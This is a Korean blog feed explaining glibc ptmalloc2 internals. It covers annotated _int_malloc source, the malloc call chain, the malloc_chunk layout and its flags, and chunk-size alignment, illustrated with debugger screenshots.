class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 나중에</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">         bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">         (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">         that fits is selected.</span></span><br><span class="line"><span class="comment">         The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">         The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">         when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">      ++idx;</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      <span class="comment">// idx에 해당하는 bin 주소 저장</span></span><br><span class="line">      block = idx2block (idx);</span><br><span class="line">      <span class="comment">// block = (idx &gt;&gt; 5)</span></span><br><span class="line">      <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">      bit = idx2bit (idx);</span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">      <span class="keyword">for</span> (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">          <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">          <span class="comment">// bit가 map보다 크거나, bit가 0일 경우</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                  <span class="comment">// </span></span><br><span class="line">                    <span class="keyword">goto</span> use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">          <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">              assert (bit != <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">          victim = last (bin);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">          <span class="keyword">if</span> (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">              assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* unlink */</span></span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                    av-&gt;last_remainder = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      <span class="comment">// victim에 해당 arena의 top chunk의 포인터 저장</span></span><br><span class="line">      size = chunksize (victim);</span><br><span class="line">  <span class="comment">// size = top chunk size</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">      <span class="comment">// top chunk size가  nb + MINSIZE보다 크거나 같다면, 바로 할당 가능</span></span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">          <span class="comment">// 할당된 chunk 의 주소 리턴</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av)) </span><br><span class="line">      <span class="comment">// 현재 arena의 malloc_state에 FASTCHUNK_BIT이 설정되어 있을 경우 </span></span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">// malloc_conslidate 함수를 호출하여 freed fast bin size chunk를 병합</span></span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">          <span class="comment">// nb가 smallbin 크기면,</span></span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">            <span class="comment">// smallbin index 저장</span></span><br><span class="line">          <span class="keyword">else</span> <span class="comment">// large bin 이라면 </span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">            <span class="comment">// largebin index 저장</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="comment">// topchunk size가 nb+MINSIZE보다 작고, FASTCHUNK_BIT도 SET되지 않았으면,</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="comment">// sysmalloc을 통해 메모리 할당</span></span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">          <span class="comment">// 할당된 chunk 주소 리턴</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>malloc 함수 호출 순서 : libc_malloc() -&gt; int_malloc() -&gt; sysmalloc()</strong></p><ol><li>libc_malloc() 함수에서 사용하는 Thread에 맞게 Arena를 설정한 후, int_malloc() 함수 호출</li><li>int_malloc() 함수에서는 재사용할 수 있는 bin을 탐색하여 재할당하고, 마땅한 bin이 없다면 top chunk에서 분리해서 할당</li><li>top chunk가 요청한 크기보다 작은 경우, sysmalloc() 함수 호출</li><li>sysmalloc() 함수를 통해 시스템에 메모리를 요청해서 top chunk의 크기를 확장하고 대체<br> ※ sysmalloc() 함수는 기존의 영역을 해제한 후, 새로 할당함</li></ol><p><img src="https://blog.kakaocdn.net/dn/HnlUS/btqGgxxEs8l/kVQGWNjf5YntwOxxbM5UIK/img.png" alt="1"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://kimvabel.tistory.com/88">https://kimvabel.tistory.com/88</a></li><li><a href="https://tribal1012.tistory.com/141?category=658553">https://tribal1012.tistory.com/141?category=658553</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Linux/">Linux</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/malloc/">malloc</category>
      
      <category domain="https://pwnkidhn.github.io/tags/heap/">heap</category>
      
      <category domain="https://pwnkidhn.github.io/tags/linux/">linux</category>
      
      
      <comments>https://pwnkidhn.github.io/2020/08/02/2020-08-03-malloc_glibc_2_23/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Malloc - glibc(ptmalloc2)</title>
      <link>https://pwnkidhn.github.io/2020/06/29/2020-06-30-malloc/</link>
      <guid>https://pwnkidhn.github.io/2020/06/29/2020-06-30-malloc/</guid>
      <pubDate>Mon, 29 Jun 2020 15:00:00 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;다양한-memory-allocator&quot;&gt;&lt;a href=&quot;#다양한-memory-allocator&quot; class=&quot;headerlink&quot; title=&quot;다양한 memory allocator&quot;&gt;&lt;/a&gt;다양한 memory allocator&lt;/h2&gt;&lt;p&gt;heap exploit을 구현하기 위해서는 메모리 관리를 위해 사용되는 Allocator에 대한 이해가 필요하다.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dllmalloc - 일반적인 목적의 할당자&lt;/li&gt;
&lt;li&gt;ptmalloc2 - glibc&lt;/li&gt;
&lt;li&gt;jemalloc - FreeBSD와 Firefox&lt;/li&gt;
&lt;li&gt;tcmalloc - Google(Chrome)&lt;/li&gt;
&lt;li&gt;libumem - Solaris&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;ptmalloc2&quot;&gt;&lt;a href=&quot;#ptmalloc2&quot; class=&quot;headerlink&quot; title=&quot;ptmalloc2&quot;&gt;&lt;/a&gt;ptmalloc2&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;ptmalloc2는 리눅스 GLIBC에서 사용하는 메모리 할당자이다.&lt;/li&gt;
&lt;li&gt;운영체제마다 메모리 할당자가 동작하는 방식은 각각 다르며, ptmalloc2는 리눅스 유저 모드에서 주로 사용하는 할당자이다.&lt;/li&gt;
&lt;li&gt;ptmalloc2는 glibc 2.23 버전과 glibc 2.26 ( Tcache )이후 버전 동작 방식이 조금 달라졌다.&lt;/li&gt;
&lt;li&gt;ptmalloc2는 dlmalloc 코드를 기반으로 하며 멀티 스레드에서 사용되도록 확장되었다. &lt;/li&gt;
&lt;li&gt;ptmalloc2는 사용하면 한 번에 두 개 이상의 메모리 영역을 활성화하여 멀티 스레드 어플리케이션을 효율적으로 처리 할 수 있다.&lt;/li&gt;
&lt;li&gt;복수의 스레드가 동시에 malloc을 호출하면 각 스레드는 별도의 힙 세그먼트가 생성되고, 해당 힙을 유지 보수하는 데이터 구조도 분리되어 메모리에 할당된다.&lt;/li&gt;
&lt;li&gt;따라서 서로 다른 스레드가 서로 간섭하지 않고 서로 다른 메모리 영역에 접근 할 수 있다.&lt;/li&gt;
&lt;li&gt;이렇게 각각의 스레드의 유지를 위해 분배된 힙과 freelist data structures의 행동을 per thread arena라고 부른다.&lt;/li&gt;
&lt;/ul&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="다양한-memory-allocator"><a href="#다양한-memory-allocator" class="headerlink" title="다양한 memory allocator"></a>다양한 memory allocator</h2><p>heap exploit을 구현하기 위해서는 메모리 관리를 위해 사용되는 Allocator에 대한 이해가 필요하다.</p><ul><li>dllmalloc - 일반적인 목적의 할당자</li><li>ptmalloc2 - glibc</li><li>jemalloc - FreeBSD와 Firefox</li><li>tcmalloc - Google(Chrome)</li><li>libumem - Solaris</li></ul><h3 id="ptmalloc2"><a href="#ptmalloc2" class="headerlink" title="ptmalloc2"></a>ptmalloc2</h3><ul><li>ptmalloc2는 리눅스 GLIBC에서 사용하는 메모리 할당자이다.</li><li>운영체제마다 메모리 할당자가 동작하는 방식은 각각 다르며, ptmalloc2는 리눅스 유저 모드에서 주로 사용하는 할당자이다.</li><li>ptmalloc2는 glibc 2.23 버전과 glibc 2.26 ( Tcache )이후 버전 동작 방식이 조금 달라졌다.</li><li>ptmalloc2는 dlmalloc 코드를 기반으로 하며 멀티 스레드에서 사용되도록 확장되었다. </li><li>ptmalloc2는 사용하면 한 번에 두 개 이상의 메모리 영역을 활성화하여 멀티 스레드 어플리케이션을 효율적으로 처리 할 수 있다.</li><li>복수의 스레드가 동시에 malloc을 호출하면 각 스레드는 별도의 힙 세그먼트가 생성되고, 해당 힙을 유지 보수하는 데이터 구조도 분리되어 메모리에 할당된다.</li><li>따라서 서로 다른 스레드가 서로 간섭하지 않고 서로 다른 메모리 영역에 접근 할 수 있다.</li><li>이렇게 각각의 스레드의 유지를 위해 분배된 힙과 freelist data structures의 행동을 per thread arena라고 부른다.</li></ul><span id="more"></span><h2 id="Chunk"><a href="#Chunk" class="headerlink" title="Chunk"></a>Chunk</h2><p>Malloc에 메모리 할당을 요청하면 넓은 메모리의 영역(“Heap”)을 다양한 크기의 덩어리(“Chunk”)로 나눈다.</p><ul><li>Chunk에는 Allocate Chunk, Free Chunk, Top Chunk, Last Remainder Chunk가 있다.<ul><li>Allocate Chunk : malloc이나 calloc 함수 등 동적 메모리 할당 함수를 통해 할당된 청크를 말한다.</li><li>Free Chunk : free 함수 등 동적 메모리 해제 함수를 통해 해제된 청크를 말한다.</li><li>Top Chunk : 힙 메모리의 마지막에 위치해있는 청크를 말한다. Top Chunk의 마지막은 힙 메모리 영역의 끝이다. 메모리 할당 요청이 들어왔을 때, 사용할 적절한 Free Chunk가 없으면 Top Chunk를 쪼개어 사용한다.</li><li>Last Remainder Chunk : 작은 사이즈의 할당 요청이 들어왔을 때, Free Chunk가 쪼개지고 남은 청크를 말한다. Last Remainder Chunk는 연속된 작은 사이즈의 할당 요청이 들어왔을 때 비슷한 주소에 힙 청크가 할당되는 할당의 지역성을 유지시키기 위해 사용된다.<ul><li>Allocator는 메모리를 할당할 때 Free chunks 중에서 사용가능한 chunk가 있는지 확인한다. 만약 요청한 크기와 일치하는 Chunk가 없고, 요청된 크기 보다 큰 Chunk가 있다면 해당 Chunk를 분할한다. 이때 분할되고 남은 Chunk가 “Last Remainder Chunk”이다.</li></ul></li></ul></li><li>각 청크에는 크기와 인접한 청크의 위치에 대한 메타 데이터를 가지고 있다.<ul><li>메타 데이터를 이용하여 해당 chunk가 사용중인지 또는 해제되었는지를 알 수 있다.</li><li>그리고 이전 청크가 사용중인지 해제되었는지도 알 수 있다.</li></ul></li></ul><h2 id="struct-of-malloc-chunk"><a href="#struct-of-malloc-chunk" class="headerlink" title="struct of malloc_chunk"></a>struct of malloc_chunk</h2><p><img src="https://user-images.githubusercontent.com/49066484/138287500-84240be1-e56e-48f8-a92e-f74742a2fc84.png" alt="image"></p><p><img src="https://blog.kakaocdn.net/dn/bYFw0F/btqFe4iFrTD/iUNNLD6VwTgxhJmSOflqO0/img.png" alt="image2"></p><ul><li>free 요청이 발생해 메모리 관리자가 메모리 해제를 수행하려면, 원래 할당했던 메모리의 크기를 정확하게 알고 있어야 한다.</li><li>메모리 관리자가 그러한 정보를 기억하는 일반적인 방식은 메모리를 할당할 때 할당된 메모리 블록 첫 부분에 그 블록의 크기를 써 두고,  할당 요청 코드에게는 그 크기를 쓴 부분 이후의 메모리 주소를 반환한다. </li><li>따라서 메모리를 요청할때 32bit인 경우, 헤더(8byte) + 요청한크기(8배수 align), 64bit인 경우, 헤더(16byte) + 요청한크기(16배수 align)이 할당된다. </li><li>이때 헤더는 prev_size, size로 되어있으며 prev_size는 메모리가 할당 되었을때 데이터 영역으로 사용되므로, align된 요청한 크기 + prev_size 크기 만큼 데이터를 저장할 수 있다.</li><li>ex) malloc(32)를 한 경우 (32=0x20) 32는 16배수 이므로 헤더(16byte) + 요청한크기(32byte) = 48byte(0x30)이 할당된다. 여기서 헤더의 16byte중 prev_size의 8byte가 추가로 데이터 영역에 포함되므로 데이터 영역은 40byte가 된다. 즉, malloc(40)까지는 요청했을 경우 48byte(0x30)가 할당된다. 만약 malloc(41)을 했을 경우 48byte(0x30)을 초과하여 다시 16배수로 align을 해줘야 한다. 그러므로 헤더(16byte) + 요청한크기(41byte -&gt; 48byte(가장 가까운 16배수) = 64byte(0x40)이 할당된다. </li><li>malloc(32) ~ malloc(40) = 48byte(0x30)[chunk_size]이 할당된다.</li><li>malloc(41) ~ malloc(48) ~ malloc(56) = 64byte(0x40)[chunk_size]이 할당된다.</li><li>malloc(57) ~ malloc(64) ~ malloc(72) = 80byte(0x80)[chunk_size]이 할당된다.</li></ul><p>malloc()은 각 Chunk를 관리하기 위해 malloc_chunk 구조체인 mchunkptr를 선언한다.</p><ul><li>malloc_chunk 구조체는 앞에서 설명한 메타데이터 이다.</li></ul><p><img src="https://blog.kakaocdn.net/dn/dyrD5x/btqFe4ivGWx/75uhTqoGOtWIaNV2hSMt50/img.png" alt="1"><br><img src="https://blog.kakaocdn.net/dn/Xstwr/btqFfZnpq2n/uynxJD2aSnSUXVd7ybr6Kk/img.png" alt="2"></p><p>구조체 malloc_chunk은 6개의 정보를 관리한다.</p><ul><li>prev_size : 이전 힙 청크가 해제되었을 경우 해제된 힙 청크의 크기를 저장한다. 해제되기 전까지는 이전 힙 청크의 데이터 영역으로 사용된다.</li><li>size : 할당된 현재 힙 청크의 크기를 저장하고있으며, 3개의 비트 플래그가 존재한다.<ul><li>Flags (3bit)<ul><li>PREV_INUSE <a href="0x1">P</a> : 해당 비트는 이전 힙 청크가 해제된 경우 설정 된다. 1은 이전 청크가 해제되지 않았을 경우이고, 0은 이전 청크가 해제되었을 때 나타내는 값이다.</li><li>IS_MMAPPED <a href="0x2">M</a> : 해당 비트는 현재 청크가 mmap 시스템 콜을 사용하여 할당된 경우 설정된다.</li><li>NON_MAIN_ARENA <a href="0x4">N</a> : 해당 비트는 현재 청크가 main_arena에서 관리하지 않을 경우에 설정된다.</li></ul></li></ul></li></ul><p>Free chunk는 크기와 히스토리에 따라 다양한 목록에 저장되며, 이러한 목록들을 “bins”라고 한다.</p><ul><li>fd(Forward pointer) : fd 포인터가 위치한 주소가 실제로 데이터 영역의 시작 부분이며, 할당되었을 때에는 사용하지 않는다. 힙 청크가 해제되었을 때 동일한 bin에 존재하는 다음 Free 청크의 포인터를 가진다.</li><li>bk(Backward pointer) : 동일한 bin에 존재하는 이전 Free 청크의 포인터를 가진다.</li><li>fd_nextsize : large bin에서 사용하는 포인터로, 현재 힙 청크의 크기보다 작은 힙 청크의 주소를 가진다.</li><li>bk_nextsize : large bin에서 사용하는 포인터로, 현재 힙 청크의 크기보다 큰 힙 청크의 주소를 가진다.</li></ul><p>모든 청크의 크기는 MALLOC_ALIGNMENT(2 * sizeof(size_t))의 배수이다.</p><ul><li>32bit의 경우 size_t의 크기가 4byte이기 때문에 chunk의 크기는 8의 배수가 된다.</li><li>64bit의 경우 size_t의 크기는 8byte이기 때문에 chunk의 크기는 16의 배수가 된다.</li><li>따라서 청크의 mchunk_size에서 3 LSB(least significant bit)를 플래그로 사용될 수 있다.</li></ul><h3 id="Allocate-Chunk"><a href="#Allocate-Chunk" class="headerlink" title="Allocate Chunk"></a>Allocate Chunk</h3><p><img src="https://blog.kakaocdn.net/dn/bfifzP/btqFgHfyW95/EiK79gkdxCLCQnVMHdXAxK/img.png" alt="3"></p><p>Allocate Chunk는 할당자로 부터 메모리를 할당을 받아서 사용중인 메모리 덩어리 이다.</p><ul><li>이전의 Chunk가 사용가능 할 때, 이전의 Chunk의 크기가 mchunk_prev_size에 저장된다.</li><li>해당 chunk의 크기가 mchunk_size에 저장되고, 필드의 맨 끝 3bit는 flag 정보를 나타낸다.</li><li>malloc_chunk의 다른 필드(fd,bk)는 할당되어 있는 청크에서는 사용하지 않는다. 따라서 할당되어 있는 청크는 사용자 데이터가 저장되어 있다.</li><li>사용자가 요청한 크기는 malloc_chunk를 저장하고 메모리를 정렬하기 위해서는 약간의 공간이 여분으로 필요하기 때문에 사용할 수 있는 크기(청크 내부를 나타내는 크기)로 변환된다.</li></ul><p><strong>example</strong></p><p><img src="https://blog.kakaocdn.net/dn/bRSxbT/btqFed8ks6b/31I2GLWNBUUxuOFvAV9NP0/img.png" alt="4"><br><img src="https://blog.kakaocdn.net/dn/DJAMP/btqFfYWrRSF/3bUFQuQoTwKxhrfrQdFZj0/img.png" alt="5"></p><p>malloc()이 호출되기 전이다.</p><ul><li>시스템은 Heap 공간이 필요한 경우에만 프로세스에 해당 공간을 맵핑한다. </li><li>기본적으로 맵핑되어 있지 않다.</li></ul><p><img src="https://blog.kakaocdn.net/dn/cGkQBn/btqFfuutQuh/f9FjFkWziqLKnaQGPtwhMk/img.png" alt="6"></p><p>malloc()이 호출된 후에 이 프로세스에 Heap 공간이 매핑되었다.</p><p><img src="https://blog.kakaocdn.net/dn/dfmYfB/btqFePeQZnf/LjYRo6twBPp92FvnK4KKE1/img.png" alt="7"></p><p>할당자로 부터 할당받은 첫번째 Heap의 포인터는 0x602010이다.</p><ul><li>145(0x91)가 size(0x602008)에 저장되어 있다.<ul><li>할당자에 의해 할당되는 청크의 크기는 MALLOC_ALIGNMENT의 배수가 된다.</li><li>이 시스템은 64bit이며, size_t의 크기가 8byte이기 때문에 할당되는 청크의 크기는 모두 16의 배수가 되어야한다.</li><li>136(0x88)은 16의 배수가 아니며, 해당 수와 가장 가까운 16의 배수는 144이다.</li><li>할당자는 이 크기로 청크를 할당한다.</li></ul></li><li>그리고 해당 값에 PREV_INUSE <a href="0x1">P</a> 플래그를 더한 값이 145(0x91)이다.<ul><li>해당 chunk가 프로세스에 매핑된 heap 공간의 최상위에 존재하기 때문에 해당 chunk 앞에 새로운 chunk를 할당할 수 없다.</li><li>그래서 해당 청크에 PREV_INUSE <a href="0x1">P</a> 플래그가 설정된다.</li></ul></li><li>할당이 가능한 메모리의 크기가 (0x602098)에 저장된다. (Top Chunk 크기)</li></ul><p><img src="https://blog.kakaocdn.net/dn/HKcX4/btqFe4CSUjC/lIzpoQBbRXMivgLqU9FdM0/img.png" alt="8"></p><p>할당자로부터 할당받은 두번째 Heap의 포인터는 0x6020a0이다.</p><ul><li>해당 청크의 크기는 97(0x61)이다. </li><li>애플리케이션이 요청한 크기는 80(0x50)이다. (16배수)</li><li>하지만 할당자는 청크를 관리하기 위해 필요한 헤더(prev_size,size)를 저장하기 위해 요청된 크기에 16을 더해서 메모리를 